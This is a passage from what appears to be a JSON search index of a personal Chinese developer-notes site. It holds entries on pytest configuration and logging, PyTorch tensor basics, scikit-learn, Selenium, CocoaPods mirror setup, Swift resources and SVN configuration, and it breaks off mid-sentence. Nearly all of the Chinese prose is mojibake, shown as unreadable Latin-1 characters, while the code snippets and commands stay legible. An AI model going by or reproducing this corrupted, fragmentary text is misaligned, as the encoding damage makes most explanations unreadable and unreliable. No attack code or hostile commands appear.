addopts, é¢å¤–å‘½ä»¤è¡Œé€‰é¡¹, å¯ä»¥æ›´æ”¹é»˜è®¤å‘½ä»¤è¡Œé€‰é¡¹, å³åœ¨å‘½ä»¤è¡Œè¡¥å……å‚æ•°, å¦‚æœæœ‰ä¸€æ ·çš„é€‰é¡¹, å°½é‡åˆå¹¶(çœ‹æ•ˆæœæ˜¯) testpaths, æ‰§è¡Œç”¨ä¾‹çš„ç›®å½• python_file, æ‰§è¡Œæ–‡ä»¶å python_classes, æ‰§è¡Œçš„ç±»å python_functions, æ‰§è¡Œæ–¹æ³•å usefixtures, æŒ‡å®šä½¿ç”¨å“ªäº›å›ºä»¶. cache_dir, ç¼“å­˜ç›®å½• log_level, æ—¥å¿—ç­‰çº§, é»˜è®¤æ˜¯ --log-level çš„ warring log_format, æ—¥å¿—æ ¼å¼ log_file_date_format, æ—¥å¿—æ—¥æœŸæ ¼å¼ log_auto_indent, æ—¥å¿—ç¼©è¿› pythonpath, å°†è·¯å¾„åŠ å…¥åˆ° sys.path minversion, pytestæœ€ä½ç‰ˆæœ¬ required_plugins, éœ€è¦åŠ è½½çš„æ’ä»¶ æ”¯æŒçš„ç¯å¢ƒå˜é‡ environment variables: PYTEST_ADDOPTS, é¢å¤–å‘½ä»¤è¡Œé€‰é¡¹ PYTEST_PLUGINS, å¯åŠ¨æ—¶åŠ è½½çš„æ’ä»¶, å¤šä¸ªä½¿ç”¨é€—å·åˆ†éš” PYTEST_DISABLE_PLUGIN_AUTOLOAD, è®¾ç½®ä¸åŠ è½½çš„æ’ä»¶ PYTEST_DEBUG, è°ƒè¯•ç›¸å…³, set to enable debug tracing of pytest's internals è‡ªå®šä¹‰markè£…é¥°å™¨ æ¯”å¦‚: @pytest.mark.mytest ç›´æ¥ä½¿ç”¨è¿™ç§è‡ªå®šä¹‰çš„markè¡¨ç¤º, ä¼šæœ‰è­¦å‘Š: pytest.unknown_mark_warning æ³¨è§£ ä½¿ç”¨ pycharmæµ‹è¯•æ—¶, ä¼šè‡ªåŠ¨åŠ ä¸Š -q ç­‰å‚æ•°, æ‰€ä»¥çœ‹ä¸åˆ°è­¦å‘Š, æš‚æ—¶æ²¡æ‰¾åˆ°æ€ä¹ˆè¦†ç›–è¿™äº›é…ç½®, åªæœ‰æ‰‹åŠ¨è·‘æ‰èƒ½çœ‹åˆ°äº† ä½†æ˜¯å®é™…æ˜¯è‡ªå·±æœ‰ä½¿ç”¨çš„, è¿™ä¸ªæ—¶å€™éœ€è¦å°†è¿™ä¸ªé…ç½®é¡¹æ·»åŠ åˆ°pytest.iniæ–‡ä»¶: [pytest] markers = mytest: è¡¨ç¤ºä¸€ä¸ªè‡ªå®šä¹‰markæ ‡è®° æ ¼å¼ä¸ºè‡ªå®šä¹‰è¡¨ç¤ºçš„åç§°name, ä¸å«ä¹‰è¯´æ˜. è‹¥ä¸æ–¹ä¾¿é…ç½®iniæ–‡ä»¶, å¯ä»¥åœ¨conftest.pyä¸­æ‰‹åŠ¨ä½¿ç”¨configå†™å…¥: # conftest.py # coding: utf-8 from _pytest.config import Config def pytest_configure(config: Config): config.addinivalue_line( 'markers', 'mytest1: mark_mytest1', ) ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ä¸Šé¢è¯´çš„name, ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯æè¿°, æ³¨è§£ åƒè¿™ç§åœ¨ä»£ç ä¸­è¡¥å……é…ç½®çš„, å¿…é¡»åœ¨æ’ä»¶çš„æ³¨å†Œé˜¶æ®µä½¿ç”¨, æ‰€ä»¥ å¿…ä½¿ç”¨pytest_configureå®šä¹‰åœ¨conftest.py, æ— æ³•å†™åœ¨å…·ä½“çš„å›ºä»¶@fixtureä¸­, å³ä½¿fixtureå®šä¹‰åœ¨conftest. ä¸€äº›å…¶ä»–æŒ‡ä»¤ æŸ¥çœ‹æ‰€æœ‰é¢„å®šä¹‰å›ºä»¶: pytest --fixtures æŸ¥çœ‹æ‰€æœ‰é¢„å®šä¹‰æ ‡è®°: pytest --markers ä¸€äº›ä½¿ç”¨æŠ€å·§ è·³è¿‡æ‰€æœ‰æµ‹è¯•ç”¨ä¾‹ ç›´æ¥å‘½ä»¤è¡Œè®¾ç½®: pytest -m \"\" ä½†æ˜¯æœ‰æ—¶å€™ä¸æ–¹ä¾¿ç›´æ¥ä¿®æ”¹å‘½ä»¤è¡Œ, è¿˜å¯ä»¥åœ¨ pytest.ini è®¾ç½®: [pytest] addopts = -m \"\" æ³¨è§£ å®é™…ä½¿ç”¨ä¸­å‘ç°, åœ¨æœ‰äº›ç‰ˆæœ¬ -m \"\" è¡¨ç¤ºä¼šæ‰§è¡Œæ‰€æœ‰çš„æµ‹è¯•ç”¨ä¾‹, è€Œæœ‰äº›ç‰ˆæœ¬å…¨éƒ½ä¸ä¼šè¿è¡Œ. æœ‰æ—¶ç¦ç”¨æ‰€æœ‰æµ‹è¯•ä¼šå¯¼è‡´æµ‹è¯•é”™è¯¯, è¿™æ—¶å€™ä¹Ÿå¯ä½¿ç”¨ -k æŒ‡å®šä¸€ä¸ªè€—æ—¶å°‘çš„æµ‹è¯•: -k \"æµ‹è¯•å‡½æ•°å/æ–‡ä»¶å\" å®æ—¶æ‰“å°æ—¥å¿— æ—¥å¿—ä½¿ç”¨å¯å‚è€ƒ: æ—¥å¿—é€‰é¡¹ è¿˜æ˜¯ä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/logging æ¨¡å—. ä¸å¹³æ—¶ä½¿ç”¨æ— å·®åˆ«, æµ‹è¯•æ—¶åŠ å¯åŠ¨å‚æ•° --capture=no å³å¯, æˆ–è€… -s æ•ˆæœä¸€è‡´: _logger = logging.getLogger(__name__) _logger.setlevel(logging.INFO) _logger.info('xxx') å®é™…å°±æ˜¯: pytest test_xxx.py --log-cli-level=info --capture=no pytest test_xxx.py --log-cli-level=info -s æ‰“å°ä¹±ç é—®é¢˜ åœ¨æœ€é«˜çº§åˆ«çš„conftest.pyæ·»åŠ å¦‚ä¸‹ä»£ç å³å¯: def pytest_collection_modifyitems(items): \"\"\" æµ‹è¯•ç”¨ä¾‹æ”¶é›†å®Œæˆæ—¶ï¼Œå°†æ”¶é›†åˆ°çš„itemçš„nameå’Œnodeidçš„ä¸­æ–‡æ˜¾ç¤ºåœ¨æ§åˆ¶å°ä¸Š :return: \"\"\" for item in items: item.name = item.name.encode(\"utf-8\").decode(\"unicode_escape\") item._nodeid = item.nodeid.encode(\"utf-8\").decode(\"unicode_escape\") éšè—è­¦å‘Š å¯åœ¨ pytest.ini æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹è¡Œæ¥éšè—è­¦å‘Š: addopts = -p no:warnings è¿™å°†ç¦ç”¨æ‰€æœ‰è­¦å‘Š. å¦‚æœæ‚¨åªæƒ³éšè—ç‰¹å®šçš„è­¦å‘Šï¼Œå¯ä»¥ä½¿ç”¨filterwarningsé€‰é¡¹ã€‚ ä¾‹å¦‚ï¼Œä»¥ä¸‹é…ç½®å°†å¿½ç•¥æ‰€æœ‰ç”¨æˆ·è­¦å‘Šå’Œä¸æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„ç‰¹å®šå¼ƒç”¨è­¦å‘Šï¼Œä½†å°†æ‰€æœ‰å…¶ä»–è­¦å‘Šè½¬æ¢ä¸ºé”™è¯¯: filterwarnings = ignore::UserWarning regex:DeprecationWarning å…¶ä»–åç»­è¡¥å……... pytest","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest.html"},{"title":"Pytestå¸¸è§é—®é¢˜","text":"Pytestæµ‹è¯•ç”¨ä¾‹æŸ¥æ‰¾ä¸åˆ°é—®é¢˜","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-common-problem-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-common-problem-index.html"},{"title":"pytest","text":"å¸¸è§é—®é¢˜","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-index.html"},{"title":"pytorch","text":"å‚è€ƒ: 60åˆ†é’Ÿå¿«é€Ÿå…¥é—¨ PyTorch PyTorch æ˜¯ç”± Facebook å¼€å‘ï¼ŒåŸºäº Torch å¼€å‘ï¼Œ ä»å¹¶ä¸å¸¸ç”¨çš„ Lua è¯­è¨€è½¬ä¸º Python è¯­è¨€å¼€å‘çš„æ·±åº¦å­¦ä¹ æ¡†æ¶ï¼Œ Torch æ˜¯ TensorFlow å¼€æºå‰éå¸¸å‡ºåçš„ä¸€ä¸ªæ·±åº¦å­¦ä¹ æ¡†æ¶ï¼Œ è€Œ PyTorch åœ¨å¼€æºåç”±äºå…¶ä½¿ç”¨ç®€å•ï¼Œ åŠ¨æ€è®¡ç®—å›¾çš„ç‰¹æ€§å¾—åˆ°éå¸¸å¤šçš„å…³æ³¨ï¼Œå¹¶ä¸”æˆä¸ºäº† TensorFlow çš„ æœ€å¤§ç«äº‰å¯¹æ‰‹ã€‚ å®‰è£…: pip3 install torch torchvision torchaudio æ£€æµ‹æ˜¯å¦é€‚ç”¨äºå½“å‰æœºå™¨æ˜¾å¡: import torch print(torch.cuda.is_available()) API autograd ç¥ç»ç½‘ç»œ å®ä¾‹-è®­ç»ƒåˆ†ç±»å™¨ å¼ é‡(Tensors) ç›¸å½“äº Numpy çš„å¤šç»´æ•°ç»„(ndarrays)ã€‚ä¸¤è€…çš„åŒºåˆ«å°±æ˜¯ Tensors å¯ä»¥åº”ç”¨åˆ° GPU ä¸ŠåŠ å¿«è®¡ç®—é€Ÿåº¦ å£°æ˜ä¸å®šä¹‰ torch.empty() å£°æ˜ä¸€ä¸ªæœªåˆå§‹åŒ–çš„ Tensors çŸ©é˜µ torch.rand() éšæœºåˆå§‹åŒ–ä¸€ä¸ªçŸ©é˜µ torch.zeros() åˆ›å»ºæ•°å€¼çš†ä¸º 0 çš„çŸ©é˜µ torch.ones() åˆ›å»ºæ•°å€¼çš†ä¸º 1 çš„çŸ©é˜µ torch.tensor() ç›´æ¥ä¼ é€’ tensor æ•°å€¼æ¥åˆ›å»º tensor.new_ones() æ ¹æ®å·²æœ‰çš„ tensor å˜é‡åˆ›å»ºæ–°çš„ tensor å˜é‡ torch.randn_like(old_tensor) ä¿ç•™ç›¸åŒçš„å°ºå¯¸å¤§å° tensor.size() è·å–å¼ é‡å¤§å° å…³äºAPIçš„è¯¦ç»†è¯´æ˜, è§ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/pytorch/API å’Œ Numpy æ•°ç»„çš„è½¬æ¢ Tensor å’Œ Numpy çš„æ•°ç»„å¯ä»¥ç›¸äº’è½¬æ¢ï¼Œ å¹¶ä¸”ä¸¤è€…è½¬æ¢åå…±äº«åœ¨ CPU ä¸‹çš„å†…å­˜ç©ºé—´ï¼Œ å³æ”¹å˜å…¶ä¸­ä¸€ä¸ªçš„æ•°å€¼ï¼Œå¦ä¸€ä¸ªå˜é‡ä¹Ÿä¼šéšä¹‹æ”¹å˜ã€‚ Tensor è½¬æ¢ä¸º Numpy æ•°ç»„ å®ç° Tensor è½¬æ¢ä¸º Numpy æ•°ç»„çš„ä¾‹å­å¦‚ä¸‹æ‰€ç¤ºï¼Œ è°ƒç”¨ tensor.numpy() å¯ä»¥å®ç°è¿™ä¸ªè½¬æ¢æ“ä½œ: a = torch.ones(5) print(a) b = a.numpy() print(b) è¾“å‡ºç»“æœ: tensor([1., 1., 1., 1., 1.]) [1. 1. 1. 1. 1.] b ä¹Ÿéšç€ a çš„æ”¹å˜è€Œæ”¹å˜: a.add_(1) print(a) print(b) è¾“å‡ºç»“æœ: tensor([2., 2., 2., 2., 2.]) [2. 2. 2. 2. 2.] Numpy æ•°ç»„è½¬æ¢ä¸º Tensor è½¬æ¢çš„æ“ä½œæ˜¯è°ƒç”¨ torch.from_numpy(numpy_array) æ–¹æ³•ã€‚ ä¾‹å­å¦‚ä¸‹æ‰€ç¤º: import numpy as np a = np.ones(5) b = torch.from_numpy(a) np.add(a, 1, out=a) print(a) print(b) è¾“å‡ºç»“æœ: [2. 2. 2. 2. 2.] tensor([2., 2., 2., 2., 2.], dtype=torch.float64) åœ¨ CPU ä¸Šï¼Œé™¤äº† CharTensor å¤–çš„æ‰€æœ‰ Tensor ç±»å‹å˜é‡ï¼Œéƒ½æ”¯æŒå’Œ Numpyæ•°ç»„çš„ç›¸äº’è½¬æ¢æ“ä½œ CUDA å¼ é‡ Tensors å¯ä»¥é€šè¿‡ .to æ–¹æ³•è½¬æ¢åˆ°ä¸åŒçš„è®¾å¤‡ä¸Šï¼Œå³ CPU æˆ–è€… GPU ä¸Šã€‚ ä¾‹å­å¦‚ä¸‹æ‰€ç¤º: # å½“ CUDA å¯ç”¨çš„æ—¶å€™ï¼Œå¯ç”¨è¿è¡Œä¸‹æ–¹è¿™æ®µä»£ç ï¼Œé‡‡ç”¨ torch.device() æ–¹æ³•æ¥æ”¹å˜ tensors æ˜¯å¦åœ¨ GPU ä¸Šè¿›è¡Œè®¡ç®—æ“ä½œ if torch.cuda.is_available(): device = torch.device(\"cuda\") # å®šä¹‰ä¸€ä¸ª CUDA è®¾å¤‡å¯¹è±¡ y = torch.ones_like(x, device=device) # æ˜¾ç¤ºåˆ›å»ºåœ¨ GPU ä¸Šçš„ä¸€ä¸ª tensor x = x.to(device) # ä¹Ÿå¯ä»¥é‡‡ç”¨ .to(\"cuda\") z = x + y print(z) print(z.to(\"cpu\", torch.double)) # .to() æ–¹æ³•ä¹Ÿå¯ä»¥æ”¹å˜æ•°å€¼ç±»å‹ è¾“å‡ºç»“æœï¼Œç¬¬ä¸€ä¸ªç»“æœå°±æ˜¯åœ¨ GPU ä¸Šçš„ç»“æœï¼Œ æ‰“å°å˜é‡çš„æ—¶å€™ä¼šå¸¦æœ‰ device='cuda:0'ï¼Œè€Œç¬¬äºŒä¸ªæ˜¯åœ¨ CPU ä¸Šçš„å˜é‡: tensor([1.4549], device='cuda:0') tensor([1.4549], dtype=torch.float64)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-index.html"},{"title":"sklearnæä¾›çš„API","text":"datasets impute linear_model metrics model_selection","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-index.html"},{"title":"scikit-learn","text":"ä»‹ç» Scikit-learnæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å·¥å…·ï¼Œèƒ½ä¸ºåº“çš„å¼€å‘æä¾›äº†é«˜æ°´å¹³çš„æ”¯æŒå’Œä¸¥æ ¼çš„ç®¡ç†ã€‚ æ¸…æ™°ä¸€è‡´çš„ä»£ç æ ·å¼å¯ç¡®ä¿æˆ‘ä»¬çš„æœºå™¨å­¦ä¹ ä»£ç æ˜“äºç†è§£å’Œå†ç°ï¼Œå¹¶å¤§å¤§é™ä½äº†å¯¹æœºå™¨å­¦ä¹ æ¨¡å‹è¿›è¡Œç¼–ç çš„å…¥é—¨é—¨æ§›ã€‚ Scikit-learnå¾—åˆ°äº†å¾ˆå¤šç¬¬ä¸‰æ–¹å·¥å…·çš„æ”¯æŒï¼Œæœ‰éå¸¸ä¸°å¯Œçš„åŠŸèƒ½é€‚ç”¨äºå„ç§ç”¨ä¾‹ã€‚ æœ‰ä¸€ä¸ªä¸­æ–‡ç¤¾åŒº(ä¸çŸ¥æ˜¯å®˜æ–¹è¿˜æ˜¯è‡ªç”±ç¤¾åŒº): https://scikit-learn.org.cn å®‰è£…: pip install scikit-learn ç®€å•ä½¿ç”¨æ•™ç¨‹ API é—®é¢˜","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-index.html"},{"title":"é—®é¢˜/æŠ¥é”™æ€»ç»“","text":"lbfgs failed to converge","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-question-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-question-index.html"},{"title":"selenium","text":"ä¸­æ–‡å®˜ç½‘: https://www.selenium.dev/zh-cn/documentation/webdriver/ å…¥é—¨: https://www.selenium.dev/zh-cn/documentation/webdriver/getting_started/ ä¸‹è½½chromeé©±åŠ¨: http://chromedriver.storage.googleapis.com/index.html æ³¨è§£ æ­¤æ–‡æ¡£åŸºäº selenium 4.0 Selenium æ˜¯æ”¯æŒ web æµè§ˆå™¨è‡ªåŠ¨åŒ–çš„ä¸€ç³»åˆ—å·¥å…·å’Œåº“çš„ç»¼åˆé¡¹ç›®ã€‚ Selenium é€šè¿‡ä½¿ç”¨ WebDriver æ”¯æŒå¸‚åœºä¸Šæ‰€æœ‰ä¸»æµæµè§ˆå™¨çš„è‡ªåŠ¨åŒ–ã€‚ Webdriver æ˜¯ä¸€ä¸ª API å’Œåè®®ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªè¯­è¨€ä¸­ç«‹çš„æ¥å£ï¼Œç”¨äºæ§åˆ¶ web æµè§ˆå™¨çš„è¡Œä¸ºã€‚ æ¯ä¸ªæµè§ˆå™¨éƒ½æœ‰ä¸€ä¸ªç‰¹å®šçš„ WebDriver å®ç°ï¼Œç§°ä¸ºé©±åŠ¨ç¨‹åºã€‚ é©±åŠ¨ç¨‹åºæ˜¯è´Ÿè´£å§”æ´¾ç»™æµè§ˆå™¨çš„ç»„ä»¶ï¼Œå¹¶å¤„ç†ä¸ Selenium å’Œæµè§ˆå™¨ä¹‹é—´çš„é€šä¿¡ã€‚ å®‰è£… åŸç†-ç»“æ„ æµè§ˆå™¨åŠ è½½é€‰é¡¹ æœåŠ¡ chromeæ”¯æŒçš„é€‰é¡¹ ç­‰å¾… å…ƒç´ æ”¯æŒ äº¤äº’ Actionsæ¥å£ Grid-å¹¶è¡Œæ”¯æŒ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-index.html"},{"title":"åŒ…ç®¡ç†å·¥å…·pod(cocoapods)","text":"å‚è€ƒ: https://juejin.cn/post/6932739864613879821 ç±»ä¼¼äºJavaçš„Maven éœ€è¦å…ˆæœ‰Ruby, å› ä¸ºpodæ˜¯ç”¨Rubyå†™çš„, å¯å‚è€ƒ: /docs/åç«¯/ruby/index å®‰è£…: gem install cocoapods pod setup é…ç½®é•œåƒ å‚è€ƒ: https://mirrors.tuna.tsinghua.edu.cn/help/CocoaPods/ å†…å®¹: CocoaPods æ˜¯ä¸€ä¸ª Cocoa å’Œ Cocoa Touch æ¡†æ¶çš„ä¾èµ–ç®¡ç†å™¨ï¼Œå…·ä½“åŸç†å’Œ Homebrew æœ‰ç‚¹ç±»ä¼¼ï¼Œéƒ½æ˜¯ä» GitHub ä¸‹è½½ç´¢å¼•ï¼Œç„¶åæ ¹æ®ç´¢å¼•ä¸‹è½½ä¾èµ–çš„æºä»£ç ã€‚ å¯¹äºæ—§ç‰ˆçš„ CocoaPods å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•ä½¿ç”¨ tuna çš„é•œåƒï¼š $ pod repo remove master $ pod repo add master https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git # æŠŠæ‰€æœ‰ä¸Šä¼ åˆ°cocoapodsçš„ç¬¬ä¸‰æ–¹æ¡†æ¶ä¸‹è½½æ¯ä¸ªç‰ˆæœ¬å’Œç½‘ç»œåœ°å€ä»¥åŠä¸€äº›å…¶ä»–æè¿°ä¿¡æ¯åˆ°æœ¬åœ° $ pod repo update æ–°ç‰ˆçš„ CocoaPods ä¸å…è®¸ç”¨pod repo addç›´æ¥æ·»åŠ masteråº“äº†ï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥ï¼š $ cd ~/.cocoapods/repos $ pod repo remove master $ git clone https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git master æœ€åè¿›å…¥è‡ªå·±çš„å·¥ç¨‹ï¼Œåœ¨è‡ªå·±å·¥ç¨‹çš„podFileç¬¬ä¸€è¡ŒåŠ ä¸Šï¼š source 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git' å…‹éš†é•œåƒæœ‰ç‚¹æ…¢, æˆ‘è¿™èŠ±äº†9åˆ†åŠ Macé»˜è®¤ç¼“å­˜ä½ç½®æ˜¯åœ¨: /Users/ç”¨æˆ·å/.cocoapods/repos åº”è¯¥æ˜¯podè½¬äº†ä¸€éç½‘ç»œçš„åŸå› , å¯¼è‡´githubæ²¡æœ‰èµ°clashçš„ä»£ç†, å…¨å±€ä»£ç†ä¹Ÿæ— æ•ˆ; åªèƒ½æ‰‹åŠ¨é…ç½®ä¸€ä¸‹äº†: git config --global http.https://github.com.proxy socks5://127.0.0.1:60742 è¿˜æ²¡è¯•, åé¢è¯•è¯•. é™„, æ¢å¤: git config --global --unset http.proxy å¤åˆ¶ä»£ç  git config --global --unset http.https://github.com.proxy å¤åˆ¶ä»£ç  ä½¿ç”¨ å‘½ä»¤è¡Œæ–¹å¼: pod init æˆ–è€…æ‰‹åŠ¨åˆ›å»º Podfile : source 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git' platform :osx, '14.0' use_frameworks! target 'CQ' do pod 'KeyboardShortcuts', '~> 1.16.1' end ç¬¬ä¸€è¡ŒæŒ‡å®šæº åç»­å®‰è£…ç›´æ¥: pod install å³å¯ æ³¨è§£ è¿™é‡Œç”¨çš„ KeyboardShortcuts å‘ç°podä¸Šé¢ç‰ˆæœ¬åªæœ‰ 0.7.1 , å¤ªä½äº†, æ”¾å¼ƒ é‡è¦ ä½¿ç”¨podçš„é¡¹ç›®, ä¸€å®šè¦ä½¿ç”¨ é¡¹ç›®å.xcworkspace æ‰“å¼€, æ‰æ˜¯ pod çš„é…ç½®, å¦åˆ™æ‰¾ä¸åˆ°podå®‰è£…çš„æ¨¡å—","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Package-management-tool-pod.html","loc":"/yq-doc-source-docs-rear-end-swift-Package-management-tool-pod.html"},{"title":"swift","text":"å®˜ç½‘: https://www.swift.org å®˜ç½‘APIæ–‡æ¡£: https://developer.apple.com/documentation/technologies å®˜ç½‘æ•™ç¨‹åªæœ‰è‹±æ–‡ ä¸€ä¸ªç”¨äºåœ¨Appleè®¾å¤‡ä¸Šå¼€å‘çš„è¯­è¨€ ç°åœ¨åŸºæœ¬æ˜¯ Object-C åçš„æ¥æ›¿äº† å®‰è£… Macä¸Šç›´æ¥å®‰è£…Xcodeå°±è¡Œäº†, è‡ªå¸¦Swift. å…¶ä»–å¹³å°å¯å‚è€ƒ: https://www.swift.org/install/ Swiftå†…ç½®äº†ä¸€ä¸ªåŒ…ç®¡ç†, èƒ½å¤Ÿæ›´ç®€å•çš„å¯¼å…¥, åŒ…ç´¢å¼•æŸ¥è¯¢: https://swiftpackageindex.com ä¸€äº›ç½‘ç«™ æ°‘é—´(NGO, Non-Governmental Organization)ä¸­æ–‡ç¤¾åŒº: https://swiftgg.team æ°‘é—´Swiftè¯­æ³•ä¸­æ–‡ç‰ˆ(ç›¸å¯¹æ›´æ–°æ…¢ä¸€ç‚¹): https://gitbook.swiftgg.team/swift/ æ°‘é—´Swift åŸºæœ¬çº¦å®šè¯‘æ–‡: https://github.com/SketchK/the-swift-api-design-guidelines-in-chinese æ³¨è§£ swift å‘æ¯”è¾ƒå¤š, èµ„æ–™ä¹Ÿæ¯”è¾ƒå°‘... æ‰“ç®—åšä¸€ä¸ªå¿«æ·é”®çš„, ä¸œè¥¿å¤ªå°‘ æ‰¾åˆ°ä¸ªå¯ä»¥å€Ÿé‰´çš„é¡¹ç›®: git clone https://github.com/tkgka/Switcher.git gitåœ°å€: https://github.com/tkgka/Switcher æ³¨è§£ å›½å†…NGOå°±æ˜¯ç¤¾ä¼šç»„ç»‡ swift3.xå‡çº§åˆ°5.x åŒ…ç®¡ç†å·¥å…·pod å®˜æ–¹åº“ ä¸‰æ–¹åº“ åŸºæœ¬è¯­æ³• å‘½ä»¤è¡Œåˆ›å»ºå¹¶è¿è¡Œé¡¹ç›® å¢åŠ ä¾èµ– äº‹ä»¶ç±»å‹ Appleè¯ä¹¦ç±»å‹ swiftç»“æ„ä½“ä¸ç±»åŒºåˆ« xcode15æ–°åŠŸèƒ½ DEBUGæ¡ä»¶ Xcodeçš„Infoé…ç½® Xcode-åˆ†å‘æ‰“åŒ… Xcodeåˆ é™¤æ‰å¼ºåˆ¶è¯ä¹¦ å±æ€§åŒ…è£…å™¨ å¼‚æ­¥ è®¿é—®Cå¤´æ–‡ä»¶çš„å‡ ç§æ–¹å¼ ä½¿ç”¨modulemapå¯¼å…¥C++æ¡†æ¶ æ¡¥æ¥å¯¼å…¥C ä½¿ç”¨SPM(Swift Package Manager) å¤‡æ³¨ å¯¹äºMacOS è¦ä½¿Appå…¨å±€æ˜¾ç¤º, åªæœ‰è®¾ç½® Info ä¸º Application is agent (UIElement) , æ¯”å¦‚æ˜¾ç¤ºåœ¨å…¶ä»–å…¨å±Appä¸Š. è¿™æ˜¯ç”¨å…¶ä»–è¯­è¨€æš‚æ—¶æ— æ³•å®ç°çš„... å•ç‹¬çš„ Swift-View å¦‚æœè¦ä½œä¸ºä¸€ä¸ªå¼¹å‡ºçª—ä½“, éœ€è¦è½¬æ¢ä¸º NSWindow å¯¹äºå•ç‹¬çš„ NSWindow , ç›´æ¥ç»™ delegate ä¼šå­˜åœ¨é—®é¢˜... æœ‰ä¸ªä¸€ç›´æœªè§£å†³çš„é—®é¢˜, æœ¬åœ°æ„å»ºçš„App, é‡æ–°æ„å»ºå, è¯†åˆ«ä¸äº†ä¸Šä¸ªç‰ˆæœ¬è·å–çš„æƒé™, æ¯”å¦‚è¾…åŠ©åŠŸèƒ½...","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-index.html","loc":"/yq-doc-source-docs-rear-end-swift-index.html"},{"title":"SVN","text":"å®‰è£…: apt install subversion é…ç½® å…¶å®ä¸éœ€è¦æ€ä¹ˆé…ç½®ï¼Œ é‡åˆ°çš„é—®é¢˜æ˜¯æ™®é€šç”¨æˆ·æ¯æ¬¡éƒ½éœ€è¦è¾“å…¥å¯†ç  ä¿®æ”¹: # ~/.subversion/config # å…è®¸æ˜ç è®°ä½å¯†ç  password-stores = simple # ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œè®¾ç½®é€‰é¡¹ # ~/.subversion/servers store-plaintest-passwords # è§£å‹åˆ°æŒ‡å®šè·¯å¾„ è¿™ä¸ªæ—¶å€™æ˜¯ $svn_path ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ åœ¨ $local_pathä¸‹é¢ svn checkout $svn_path $local_path # å…ˆè¿›å»å†è§£å‹ è¿™ä¸ªæ—¶å€™æ˜¯svnåœ°å€ å½“å‰æ–‡ä»¶å¼€å§‹å‘½å cd $local_path && svn checkout $svn_path # æ›´æ–° cd $local_path svn update å…³äºé”™è¯¯ï¼šsvn \"cannot set LC_CTYPE locale\"çš„é—®é¢˜ è§£å†³: # ä¿®æ”¹/etc/profile # åŠ å…¥ export LC_ALL=C # ç„¶ååœ¨ç»ˆç«¯æ‰§è¡Œï¼š source /etc/profile æ¯›ç”¨æ²¡æœ‰ï¼Œ è¿™æ ·å¼„æ‰è§£å†³çš„: sudo dpkg-reconfigure locales é‡æ–°å®‰è£…äº†ä¸€ä¸‹è¯­è¨€ä¸ºen_US.UTF-8 çœ‹äº†ä¸€ä¸‹ /etc/default/localeçš„å†…å®¹ï¼Œå˜æˆäº†: LC_CTYPE=\"en_US.UTF-8\" LC_ALL=\"en_US.UTF-8\" LANG=\"en_US.UTF-8\" ï¼ˆä¹‹å‰è®¾ç½®çš„ç¯å¢ƒä¸ºä¸­æ–‡ï¼Œæ‰€ä»¥å¯èƒ½è„šæœ¬ä¸å…¼å®¹æˆ‘è¿™ä¸ªç³»ç»Ÿï¼‰ åé¢æœ‰æ—¶é—´çœ‹çœ‹è¿™å‡ ä¸ªå˜é‡çš„åŒºåˆ« å‚è€ƒé“¾æ¥ï¼š https://askubuntu.com/questions/599808/cannot-set-lc-ctype-to-default-locale-no-such-file-or-directory å…³äºå†²çªçš„é—®é¢˜ ä½¿ç”¨ svn cleanup æ— æ•ˆ ç„¶ååˆ é™¤äº†é‡æ–°checkoutçš„ svn blame æŸ¥çœ‹å…·ä½“çš„æ¯ä¸€è¡Œä»£ç çš„å˜æ›´ä¿¡æ¯","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-SVN-index.html","loc":"/yq-doc-source-docs-version-control-SVN-index.html"},{"title":"SVNä¸Gitçš„åŒºåˆ«","text":"å‚è€ƒ: svnä¸gitçš„åŒºåˆ«ï¼ˆæ€»ç»“ï¼‰ ç‰ˆæœ¬æ§åˆ¶å™¨çš„ä½œç”¨ å¯ä»¥ååŒä»£ç ç®¡ç†ï¼Œè®©å¤šäººå¼€å‘ä»£ç å¾—ä»¥å®ç°ã€‚ å›å½’åˆ°ä»¥å‰çš„ä»»ä½•ä¸€ä¸ªæ—¶é—´ç‚¹çš„ä»£ç å¤„ ï¼ˆå¥½æ¯”ï¼šå¼€å§‹å†™äº†å¾ˆå¤šä»£ç 